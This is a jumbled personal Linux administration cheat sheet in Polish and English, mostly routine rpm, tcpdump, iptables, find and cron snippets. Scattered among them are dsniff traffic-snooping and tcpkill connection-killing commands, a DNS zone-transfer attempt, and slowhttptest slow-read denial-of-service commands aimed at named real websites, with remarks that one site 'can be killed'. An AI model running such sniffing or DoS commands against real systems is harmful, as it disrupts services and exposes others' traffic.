      /usr/share/doc/bash-3.2 (4096 bytes)
      /usr/share/doc/bash-3.2/CHANGES (221125 bytes)
      /usr/share/doc/bash-3.2/COMPAT (11659 bytes)
      /usr/share/doc/bash-3.2/FAQ (73644 bytes)
      ....

      Można także wyświetlić lisŧę wszystkich tagów, jakie mogą zostać użyte w opcji queryformat:
      # rpm --querytags
      HEADERIMAGE
      HEADERSIGNATURES
      HEADERIMMUTABLE
      HEADERREGIONS
      HEADERI18NTABLE
      SIGSIZE
      SIGPGP
      SIGMD5
      PKGID
      SIGGPG
      /usr/sbin/groupadd -g 22 -r -f utmp
      postinstall scriptlet (using /bin/sh):
      touch /var/log/wtmp /var/run/utmp /var/log/btmp
      chown root:utmp /var/log/wtmp /var/run/utmp /var/log/btmp
      chmod 664 /var/log/wtmp /var/run/utmp
      chmod 600 /var/log/btmp

      /sbin/chkconfig --add netfs
      /sbin/chkconfig --add network
      /sbin/chkconfig --add netconsole
      /sbin/chkconfig --add rawdevices
      preuninstall scriptlet (using /bin/sh):
      if [ $1 = 0 ]; then
        /sbin/chkconfig --del netfs
        /sbin/chkconfig --del network
        /sbin/chkconfig --del netconsole
        /sbin/chkconfig --del rawdevices
      fi
    * queryformat – samodzielne utworzenie informacji o pakiecie

      Polecenie to pozwala na samodzielne zdefiniowanie listy informacji, jakie zostaną wyświetlone o danym pakiecie. Pełny opis polecenie znajduje się w dokumentacji oraz na stronach podanych na końcu wpisu.

      Wyświetlenie nazwy oraz wersji pakietu:
      # rpm -q --queryformat '%{NAME}-%{VERSION}-%{RELEASE}\n' bash
      bash-3.2-24.el5

      Wyświetlenie daty instalacji pakietu:
      # rpm -q --queryformat '%{NAME} was installed on %{INSTALLTIME:date}\n' bash
      bash was installed on Tue 23 Feb 2010 08:06:34 PM CET

      Wyświetlenie listy plików, które znajdują się w pakiecie łącznie z ich rozmiarami:
      # rpm -q --queryformat '%{NAME}: [%{FILENAMES} (%{FILESIZES} bytes)\n]' bash
      bash: /bin/bash (729292 bytes)
      /bin/sh (4 bytes)
      /etc/skel/.bash_logout (33 bytes)
      /etc/skel/.bash_profile (176 bytes)
      /etc/skel/.bashrc (124 bytes)
      /usr/bin/bashbug-32 (7044 bytes)
      /usr/share/doc/bash-3.2 (4096 bytes)
      /usr/share/doc/bash-3.2/CHANGES (221125 bytes)
      /usr/share/doc/bash-3.2/COMPAT (11659 bytes)
      /usr/share/doc/bash-3.2/FAQ (73644 bytes)
      ....

      Można także wyświetlić lisŧę wszystkich tagów, jakie mogą zostać użyte w opcji queryformat:
      # rpm --querytags
      HEADERIMAGE
      HEADERSIGNATURES
      HEADERIMMUTABLE
      HEADERREGIONS
      HEADERI18NTABLE
      SIGSIZE
      SIGPGP
      SIGMD5
      PKGID
      SIGGPG

--------------------------

Using dnscap to debug DNS problems on Linux hosts

$ dnscap -i eth0 -g

-----------------------------

My system will not boot. How do I generate a sysreport/sosreport from the rescue environment

 sosreport 



-----------------------------------

Cleanly list available wireless networks (using iwlist)

$ iwlist wlan0 scan | sed -ne 's#^[[:space:]]*\(Quality=\|Encryption key:\|ESSID:\)#\1#p' -e 's#^[[:space:]]*\(Mode:.*\)$#\1\n#p'

------------------------------------

Edit a file on a remote host using vim
$ ssh -X -C -c blowfish root@localhost "gedit /etc/hostname"

------------------------------------

Check your unread GMail e-mails using the Linux command line 

curl -u username:password --silent “https://mail.google.com/mail/feed/atom” | tr -d ‘\n’ | awk -F ‘<entry>’ ‘{for (i=2; i<=NF; i++) {print $i}}’ | sed -n “s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p”

-----------------------------------

Set e-mail reminders from the Linux command line 

echo “mail -s ‘remember the birthday party’ your_email@server.com < /dev/null” | at 15:19

--------------------------

Ping all the hosts in /etc/hosts 

for i in `grep -v “^#” /etc/hosts | awk ‘{print $1}’`; do ping -c 1 -w 2 $i ; echo; done

-------------------------


read mac address

ifconfig | awk '/eth/{print $NF}'

-------------------------

Limit ściągania 

trickle -s -d LIMIT_SCIAGANIA -u LIMIT_WYSYLANIA program_do_uruchomienia

czyli np.:

trickle -s -d 50 wget http://download.fedoraproject.org/pub/fedora/linux/releases/14/Live/i686/Fedora-14-i686-Live-Desktop.iso

---------------------------

tailf  /var/log/messages | awk '{print $3,$7,$8,$10,$12,$13,$14,$21,$22,$23}'

----------------------------

geoip() { lynx -dump "http://www.geoiptool.com/en/?IP=$1" | sed -n '/Host Name/,/Postal code/p' ; }

---------------------

list my mac address

 ifconfig -a | egrep "eth|wl" | awk '{print $1, $5}'
 
-------------------------

Quick Full Screen RDP connection

alias rdp='rdesktop -u userj -g 1600x1200 -D -r disk:home=/home -r clipboard:PRIMARYCLIPBOARD'

-------------------------

pid list by httpd listen port

lsof | awk '/*:https?/{print $2}' | sort -u

---------------------------

my ip address

wget http://cmyip.com -O - -o /dev/null | awk '/\<title/ {print $4}'

----------------------------

blkid
---------------------------

Watch RX/TX rate of an interface in kb/s

while [ /bin/true ]; do OLD=$NEW; NEW=`cat /proc/net/dev | grep ppp0 | tr -s ' ' | cut -d' ' -f "3 11"`; echo $NEW $OLD | awk '{printf("\rin: % 9.2g\t\tout: % 9.2g", ($1-$3)/1024, ($2-$4)/1024)}'; sleep 1; done

--------------------


mysqldump -u root -p2011eu plik_2008_2 > dump-`date +%Y.%m.%d`.sql | gzip dump-`date +%Y.%m.%d`.sql

Generalnie katalogi na 755 pliki na 644

find . -type f -exec chmod 644 {} \;
find . -type d -exec chmod 755 {} \;

chmod 707 images
chmod 707 images/stories
chown apache:apache cache

# lvs -a -o +devices

# vgs -a -o +devices -P
 
lvs -a -o +devices -L
lvs -a -o +devices -P

tcpdump "udp and (src port 514 or 53)" and host 192.168.1.131

ps auxf --width=200

---------------------


Chcia³bym zmieniæ uprawnienia dla wszystkich katalogów i podkatalogów na 755, a plików na 644. Czy kto móg³by mi powiedzieæ jak to zrobiæ? 

find . -type d -exec chmod 755 "{}" \;
find . -type f -exec chmod 644 "{}" \; 

No to spróbuj:

find . -type d -exec chmod 755 '{}' +
find . -type f -exec chmod 644 '{}' + 

-------------------------------

dig @10.1.1.202 domena.gov.pl axfr

---------

[root@webzoo ~]# rpm -qf /usr/share/rhn/virtualization/poller.py

-------------------------

iotop
ncdu

---
konfiguracja PAM

Aby zbierały się informacje o tym, jakie polecenia były wykonywane przez użytkownika root musimy odpowiednio przygotować PAM do tego, aby takie informacje nam audytował.
3.1. W pliku /etc/pam.d/system-auth na szczycie sekcji session dopisujemy:

1
session required pam_tty_audit.so disable=* enable=root
3.2. W pliku /etc/pam.d/su oraz /etc/pam.d/su-l do sekcji session dopisujemy:

1
session required pam_tty_audit.so enable=root
3.3. Jeżeli używamy sudo w pliku /etc/pam.d/sudo oraz /etc/pam.d/sudo-i do sekcji session dopisujemy:
-----------------

cgroups - limitowanie zasobów

------------------

Other container technologies include
Solaris Zones (Solaris)
BSD jails (FreeBSD)
Linux-Vserver (Linux)
OpenVZ (Linux)
FreeVPS (Linux)

--------------------


-------------------------------
Task: Backup /home/tom to /mnt/usbpen
$ rsync -au /home/tom /mnt/usbpen
To delete files in backup directory that no longer exist in directory being backed up, enter:
$ rsync -au --delete /home/tom /mnt/usbpen

------------------------------
sshpass: Login To SSH Server / Provide SSH Password Using A Shell Script

Find all perl (*.pl) files in current directory:
$ find . -name '*.pl'
$ find . -type f -name '*.pl'
$ find / -type f -name httpd.conf
$ find /usr/local -type f -name httpd.conf
Run ls -l command on all *.c files to get extended information :
$ find . -name "*.c" -type f -exec ls -l {} \;
You can run almost all UNIX command on file. For example, modify all permissions of all files to 0700 only in ~/code directory:
$ find ~/code -exec chmod 0700 {} \;
Search for all files owned by a user called payal:
$ find . -user
$ find . -user payal

--- - ------------------------------
Run crontab Every 10 Minutes

$ crontab -e
Each cronjob has following syntax:

# +---------------- minute (0 - 59)
# |  +------------- hour (0 - 23)
# |  |  +---------- day of month (1 - 31)
# |  |  |  +------- month (1 - 12)
# |  |  |  |  +---- day of week (0 - 6) (Sunday=0 or 7)
# |  |  |  |  |
  *  *  *  *  *  command to be executed

To get crontab to run a task every 10 minutes you could type as follow
*/10 * * * * /path/to/command

--------------------------------------

mailsnarf -i eth1
filesnarf -i eth1 >> /var/filesnarf.txt&
mailsnarf -i eth1 >> /var/mailsnarf.txt&
cat /var/log.txt | grep pop3 | uniq
tcpkill -i eth1 -9 host 10.1.2.3
tcpkill -i eth1 host 10.1.2.3 and \( 10.1.1.5 or 10.1.1.4 \)

-----------

tcpdump -i eth1 port 80
tcpdump -i eth1 port 443 and host google.com
tcpdump -i eth1 host 10.1.3.114 and \( 10.1.1.5 or 10.1.1.14 \)
tcpdump -i eth1 host 10.1.2.44 and \(10.1.1.4 or 10.3.16.3 or 10.1.1.5 \)
tcpdump -i eth1 host 10.1.2.44 and \(10.1.1.4 or 10.3.16.3 or 10.1.1.5 \) or host 10.1.3.114 and port 80
tcpdump icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply
tcpdump -i eth1 icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply
tcpdump -i eth1 host 10.1.2.114 and icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply
tcpdump -i eth1 host 10.1.2.114 and icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply
tcpdump -i eth1 host 10.1.1.4 and icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply
tcpdump -i eth1 host 10.1.1.4 and icmp[icmptype] and icmp[icmptype] != icmp-echoreply
tcpdump -i eth1 host 10.1.1.4 and icmp[icmptype]
tcpdump -i eth1 host 10.1.1.4 and icmp[icmptype] = icmp-echo and icmp[icmptype] = icmp-echoreply
tcpdump -i eth1 host 10.1.1.4 and icmp[icmptype] = icmp-echoreply
tcpdump -i eth1 host 10.1.2.114 and icmp[icmptype] = icmp-echoreply
tcpdump -i eth1 host 10.1.3.114 and icmp[icmptype] = icmp-echoreply
tcpdump -i eth1 host 10.1.3.114 and icmp[icmptype] = any
tcpdump -i eth1 host 10.1.3.114 and icmp[icmptype] = all
tcpdump -i eth1 host 10.1.3.114 and icmp

----------

tcpkill -i wlan0 −9 host www.google.com
/usr/sbin/tcpkill −9 host www.google.com and host www.yahoo.com
To block well−known ports eg., napster (port 8888 and port 6699) or gnutella (port 6346), the command:
/usr/sbin/tcpkill −9 port 8888 and port 6699
or
/usr/sbin/tcpkill −9 port 6346 --> will do the trick.

dsniff is a collection of tools for network auditing and penetration testing. dsniff, filesnarf,

dsnif
sprawdzanie url 
urlsnarf -i wlan0
dmsetap teable

--------

Testy IOPS:
sysbench --test=fileio --file-total-size=150G --file-test-mode=rndrw --init-rng=on --max-time=300 --max-requests=0 run
fio --filename=/dev/sdx --direct=1 --rw=randrw --refill_buffers --norandommap --randrepeat=0 --ioengine=libaio --bs=8k --rwmixread=70 --iodepth=16 --numjobs=16 --runtime=60 --group_reporting --name=8k7030test

blkid 
hdparm -tT /dev/sdb1
  
------------------

# Usuwamy poprzednie regóły

iptables -F INPUT
iptables -F FORWARD
iptables -F OUTPUT

Udostępnianie Internetu w sieci wewnętrznej: przekazywanie pakietów i tzw. maskaradę, czyli maskowaniepakietów pochodzących z wewnętrznej sieci.

iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward

# Pozwalamy pakietom swobodnie biegać po naszym komputerze (odblokowujemu pętlęzwrotną LOOPBACK)

iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Pozwalamy na pingowanie nas i innych

iptables -A INPUT -p icmp -s 0/0 -d 0/0 -j ACCEPT
iptables -A OUTPUT -p icmp -s 0/0 -d 0/0 -j ACCEPT

Odblokowujemy dostęp do DNS dla naszego komputera (bo inaczej nie będziemy mogli np. przeglądać stron WWW - no chyba, że komuś chce się wpisywać IP :-))

iptables -A INPUT -p tcp -s 0/0 --sport 53 -d 207.46.197.102 -j ACCEPT
iptables -A OUTPUT -p tcp -s 207.46.197.102 -d 0/0 --dport 53 -j ACCEPT

iptables -A INPUT -p udp -s 0/0 --sport 53 -d 207.46.197.102 -j ACCEPT
iptables -A OUTPUT -p udp -s 207.46.197.102 -d 0/0 --dport 53 -j ACCEPT

---dns ustawic najlepiej w styli ping
Odblokowujemy przeglądanie WWW dla naszego komputera
iptables -A INPUT -p tcp -s 0/0 --sport 80 -d 207.46.197.102 -j ACCEPT
iptables -A OUTPUT -p tcp -s 207.46.197.102 -d 0/0 --dport 80 -j ACCEPT

# Sieć lokalna
# Pozwalamy pingować wszystko
iptables -A FORWARD -p icmp -s 0/0 -d 0/0 -j ACCEPT
iptables -A FORWARD -p icmp -s 0/0 -d 0/0 -j ACCEPT
# pozwalamy na wszystko z sieci wewnetrznej
iptables -A FORWARD -p tcp -s 0/0 -d 0/0 -j ACCEPT
iptables -A FORWARD -p udp -s 0/0 -d 0/0 -j ACCEPT

---- Web Application Firewall Detection Tool
                              
wafw00f https://archiwalny.domena.pl/

slowhttptest -c 65539 -X -g -o slow_read_stats -r 4500 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://archiwalny.domena.pl -p 3 
wpływ na działanie wszystkich stron --->

slowhttptest -c 65539 -X -g -o slow_read_stats -r 4500 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://secure.e-konsulat.gov.pl/ -p 3 

kalendarium.domena.pl --> pid.gov.pl

http://propertyrestitution.pl -  da sie zabić

-----

find /var/log -type f -iregex '.*[^\.][^0-9]+$' -not -iregex '.*gz$' 2> /dev/null | xargs tail -n0 -f | ccze -A
tail -f access.log | cut -d' ' -f1 | logtop -s 20000

for i in /var/log/cisco.log.*.gz; do gzip -cd $i | grep tekst; done	
fgrep -f grep.test grep.text.przeszukiwane

--------------


----------
 Kopiuj lvm przez ssh

    Use lvcreate to create the new logical volume on the destination host with the same size as the source logical volume. Use the lvdisplay command to find out the required size.
    virsh shutdown the source KVM guest
    On the source host: screen dd if=/dev/vg_ssd/lv_vm_wopr | pv | ssh -C root@desthost dd of=/dev/vg0/lv_vm_wopr
    Wait until finished

---------- 

 sed -i -e 's/;cgi.fix_pathinfo=1/cgi.fix_pathinfo=0/g' plik.txt

 echo "\ndaemon off;" >> plik.txt



 # w wierszu skopiowanie pliku pod wele nazw
 for i in {2..7}; do cp privoxy_21.conf privoxy_2$i.conf; done


------------------



